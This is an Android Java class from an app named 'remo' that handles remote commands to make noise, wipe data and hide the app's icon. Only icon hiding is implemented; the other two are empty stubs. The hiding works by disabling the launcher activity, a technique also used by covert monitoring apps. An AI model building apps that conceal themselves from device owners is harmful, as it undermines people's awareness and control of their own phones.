package com.remo.features;

import android.content.ComponentName;
import android.content.pm.PackageManager;
import com.remo.App;
import com.remo.connections.Feature;

public class Tasks extends Feature {
    @Override
    public void AsyncTaskFunc(String Params) {

    }

    @Override
    public void update(String Params) {
        String[] params = Params.split("-");
        String MakeNoise = params[0];
        String WipeData = params[1];
        String HideIcon = params[2];

        if(MakeNoise.equals("1")){
            //playAudio
        }
        if(WipeData.equals("1")){

        }
        if(HideIcon.equals("1")){
            ComponentName component =
                    new ComponentName("com.remo",
                            "com.remo.MainActivity");

            App.get().getApplicationContext().getPackageManager().setComponentEnabledSetting(
                    component,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
        }
        else{
            ComponentName component =
                    new ComponentName("com.remo",
                            "com.remo.MainActivity");

            App.get().getApplicationContext().getPackageManager().setComponentEnabledSetting(
                    component,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP);
        }



    }
}
